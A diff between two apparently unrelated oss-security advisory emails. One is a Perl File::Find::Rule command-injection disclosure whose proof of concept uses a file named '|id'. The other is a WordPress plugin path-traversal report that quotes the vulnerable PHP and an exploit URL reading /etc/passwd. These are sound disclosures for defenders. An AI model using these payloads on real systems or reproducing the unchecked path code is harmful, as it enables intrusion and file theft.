@@ -1,4 +1,9 @@
-Received: (qmail 24328 invoked by uid 550); 5 Jun 2025 18:17:55 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1194" "Tuesday" "23" "June" "2015" "16:07:49" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<B84727D4-14F8-42D7-B115-D5AD2D9DCCF4@me.com>" "34" "[oss-security] Remote file download vulnerability in download-zip-attachments v1.0" nil nil nil "6" "2015062320:07:49" "[oss-security] Remote file download vulnerability in download-zip-attachments v1.0" (number mark "U       larry0@me.co Jun 23   34/1194  " thread-indent "\"[oss-security] Remote file download vulnerability in download-zip-attachments v1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 3440 invoked by uid 550); 23 Jun 2015 20:08:08 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,115 +12,54 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 24009 invoked from network); 5 Jun 2025 12:00:52 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=cpansec.org; s=gm1;
-	t=1749124842;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:mime-version:mime-version:content-type:content-type;
-	bh=NSqF+w02mFV2uvGV2BbDUIVKS3JMRDoigWqTFHWzhnA=;
-	b=X9DhncSQMY/OP3WWDcxrfRf5JhtKeB0Frs+qOElJ0Qyx+a6jQ+UP/NICUynOZAsy4Nr/UO
-	81t2P7cRWPxv7MOJWsjKFCOCJlseDZTRSOubhzU8lEmN5YztU5bUH6q4cNgeBAzy5k7tSR
-	raf6wIWRrlleY0dqbqdCLN2sMIA3k2MQbhNmKIkeIgDELe+yedwS8mrv6B71xSSfsSTUxP
-	jiJh+ptCZkFZgUHRHhOahCCl4kgYQNxMPyCgXojfhsen+iatLmoamhwOGt5gGg2+3fcYm3
-	EG9uOcedavNIRvo0D+95yfLE7rXHudpyykW9l/RDNfn95iZKt4GSsqR0SlDCYQ==
-MIME-Version: 1.0
-Date: Thu, 05 Jun 2025 09:00:42 -0300
-From: Timothy Legge <timlegge@cpansec.org>
-To: oss-security@lists.openwall.com
-Message-ID: <af08b59edaa5fd29007603e146a3a43e@cpansec.org>
-X-Sender: timlegge@cpansec.org
-Content-Type: multipart/mixed;
- boundary="=_098a4ed6955856d6ec51b3c3f4a1d913"
-X-GND-State: clean
-X-GND-Score: 0
-X-GND-Cause: gggruggvucftvghtrhhoucdtuddrgeeffedrtddugdefiedtucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuifetpfffkfdpucggtfgfnhhsuhgsshgtrhhisggvnecuuegrihhlohhuthemuceftddunecunecujfgurhepggffhffvuffkgigtsehmtdhjredttddvnecuhfhrohhmpefvihhmohhthhihucfnvghgghgvuceothhimhhlvghgghgvsegtphgrnhhsvggtrdhorhhgqeenucggtffrrghtthgvrhhnpeekhfejtdfhvdelffelgfefudffhfeugffgvedvgfejiedugfekhfetleekueelkeenucffohhmrghinhepmhgvthgrtghprghnrdhorhhgpdhgihhthhhusgdrtghomhdprhhulhgvrdhpmhdptghprghnrdhorhhgnecukfhppedutddrvddttddrvddtuddrvddunecuvehluhhsthgvrhfuihiivgeptdenucfrrghrrghmpehinhgvthepuddtrddvtddtrddvtddurddvuddphhgvlhhopeifvggsmhgrihhlrdhgrghnughirdhnvghtpdhmrghilhhfrhhomhepthhimhhlvghgghgvsegtphgrnhhsvggtrdhorhhgpdhnsggprhgtphhtthhopedupdhrtghpthhtohepohhsshdqshgvtghurhhithihsehlihhsthhsrdhophgvnhifrghllhdrtghomh
-X-GND-Sasl: timlegge@cpansec.org
-Subject: [oss-security] CVE-2011-10007: File::Find::Rule through 0.34 for Perl is vulnerable
- to Arbitrary Code Execution when `grep()` encounters a crafted file name
+Received: (qmail 3405 invoked from network); 23 Jun 2015 20:08:02 -0000
+X-Proofpoint-Virus-Version: vendor=fsecure
+ engine=2.50.10432:5.14.151,1.0.33,0.0.0000
+ definitions=2015-06-23_07:2015-06-23,2015-06-23,1970-01-01 signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
+ reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1506230320
+From: "Larry W. Cashdollar" <larry0@me.com>
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <B84727D4-14F8-42D7-B115-D5AD2D9DCCF4@me.com>
+Date: Tue, 23 Jun 2015 16:07:49 -0400
+To: Open Source Security <oss-security@lists.openwall.com>
+MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
+X-Mailer: Apple Mail (2.2098)
+Subject: [oss-security] Remote file download vulnerability in download-zip-attachments v1.0
 
---=_098a4ed6955856d6ec51b3c3f4a1d913
-Content-Transfer-Encoding: 7bit
-Content-Type: text/plain; charset=US-ASCII;
- format=flowed
+Title: Remote file download vulnerability in download-zip-attachments v1.0
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-06-10
+Download Site: https://wordpress.org/plugins/download-zip-attachments/
+Vendor: rivenvirus
+Vendor Notified: 2015-06-15
+Vendor Contact: https://profiles.wordpress.org/rivenvirus/
+Advisory: http://www.vapid.dhs.org/advisory.php?v=3D129
+Description:=20
+Download all attachments from the post into a zip file.
 
-========================================================================
-CVE-2011-10007                                       CPAN Security Group
-========================================================================
+Vulnerability:
+from download-zip-attachments/download.php makes no checks to verify the do=
+wnload path is with in the specified upload directory.
 
-         CVE ID:  CVE-2011-10007
-   Distribution:  File-Find-Rule
-       Versions:  through 0.34
+<?php
+if(isset($_REQUEST['File']) && !empty($_REQUEST['File'])){
+   define('WP_USE_THEMES', false);
+   require('../../../wp-load.php');=20=20=20=20
+   require "create_zip_file.php";
+   $uploads =3D wp_upload_dir();=20
+   $tmp_location =3D $uploads['path']."/".$_REQUEST['File'];
+   //echo $tmp_location;
+   $zip =3D new CreateZipFile;
+   $zip->forceDownload($tmp_location,false);=20=20=20=20=20
+   unlink($tmp_location);=20
+   exit;
+}
 
-       MetaCPAN:  https://metacpan.org/dist/File-Find-Rule
-       VCS Repo:  https://github.com/richardc/perl-file-find-rule
-
-
-File::Find::Rule through 0.34 for Perl is vulnerable to Arbitrary Code
-Execution when `grep()` encounters a crafted file name
-
-Description
------------
-File::Find::Rule through 0.34 for Perl is vulnerable to Arbitrary Code
-Execution when `grep()` encounters a crafted filename.
-
-A file handle is opened with the 2 argument form of `open()` allowing
-an attacker controlled filename to provide the MODE parameter to
-`open()`, turning the filename into a command to be executed.
-
-Example:
-
-$ mkdir /tmp/poc; echo > "/tmp/poc/|id"
-$ perl -MFile::Find::Rule \
-     -E 'File::Find::Rule->grep("foo")->in("/tmp/poc")'
-uid=1000(user) gid=1000(user) groups=1000(user),100(users)
-
-Problem types
--------------
-- CWE-78 Improper Neutralization of Special Elements used in an OS
-   Command ('OS Command Injection')
-
-Solutions
----------
-Users should update to a fixed version when available, or apply the
-patch provided in the references section, or use a patched version
-provided by their OS distribution
-
-
-References
-----------
-https://metacpan.org/release/RCLAMP/File-Find-Rule-0.34/source/lib/File/Find/Rule.pm#L423
-https://rt.cpan.org/Public/Bug/Display.html?id=64504
-https://github.com/richardc/perl-file-find-rule/pull/4
-https://github.com/richardc/perl-file-find-rule/commit/df58128bcee4c1da78c34d7f3fe1357e575ad56f.patch
-
-Timeline
---------
-- 2011-01-04: A bug was reported by Kevin Ryde to the upstream RT
-   bugtracker described as "grep() can truncate files".
-- 2025-06-04: CPANSec became aware of the bug and started triage. Code
-   execution impact was confirmed, a patch was made, and the author, the
-   distros list and additional downstream vendors were notified.
-
---=_098a4ed6955856d6ec51b3c3f4a1d913
-Content-Transfer-Encoding: base64
-Content-Type: text/x-diff; charset=us-ascii;
- name=0001-Fix-CVE-2011-10007-for-File-Find-Rule.patch
-Content-Disposition: attachment;
- filename=0001-Fix-CVE-2011-10007-for-File-Find-Rule.patch;
- size=680
-
-RnJvbSBlMzg5MjMxNzliODg5ZTdiMDNlNTQ5MTMwYTM4ZWM0ZTRhMjhiN2Q4IE1vbiBTZXAgMTcg
-MDA6MDA6MDAgMjAwMQpGcm9tOiBTdGlnIFBhbG1xdWlzdCA8c3RpZ0BzdGlnLmlvPgpEYXRlOiBU
-aHUsIDUgSnVuIDIwMjUgMDM6NDU6NTAgKzAyMDAKU3ViamVjdDogW1BBVENIXSBGaXggQ1ZFLTIw
-MTEtMTAwMDcgZm9yIEZpbGU6OkZpbmQ6OlJ1bGUKCi0tLQogbGliL0ZpbGUvRmluZC9SdWxlLnBt
-IHwgMiArLQogMSBmaWxlIGNoYW5nZWQsIDEgaW5zZXJ0aW9uKCspLCAxIGRlbGV0aW9uKC0pCgpk
-aWZmIC0tZ2l0IGEvbGliL0ZpbGUvRmluZC9SdWxlLnBtIGIvbGliL0ZpbGUvRmluZC9SdWxlLnBt
-CmluZGV4IGZlY2NjNzYuLmQ0ZGM0NzUgMTAwNjQ0Ci0tLSBhL2xpYi9GaWxlL0ZpbmQvUnVsZS5w
-bQorKysgYi9saWIvRmlsZS9GaW5kL1J1bGUucG0KQEAgLTQyMCw3ICs0MjAsNyBAQCBzdWIgZ3Jl
-cCB7CiAKICAgICAkc2VsZi0+ZXhlYyggc3ViIHsKICAgICAgICAgbG9jYWwgKkZJTEU7Ci0gICAg
-ICAgIG9wZW4gRklMRSwgJF8gb3IgcmV0dXJuOworICAgICAgICBvcGVuIEZJTEUsICc8JywgJF8g
-b3IgcmV0dXJuOwogICAgICAgICBsb2NhbCAoJF8sICQuKTsKICAgICAgICAgd2hpbGUgKDxGSUxF
-PikgewogICAgICAgICAgICAgZm9yIG15ICRwIChAcGF0dGVybikgewotLSAKMi40OS4wCgo=
-
---=_098a4ed6955856d6ec51b3c3f4a1d913--
+CVEID: 2015-4704
+OSVDB:
+Exploit Code:
+	=E2=80=A2 http://www.example.com/wp-content/plugins/download-zip-attachmen=
+ts/download.php?File=3D../../../../../../../../etc/passwd=
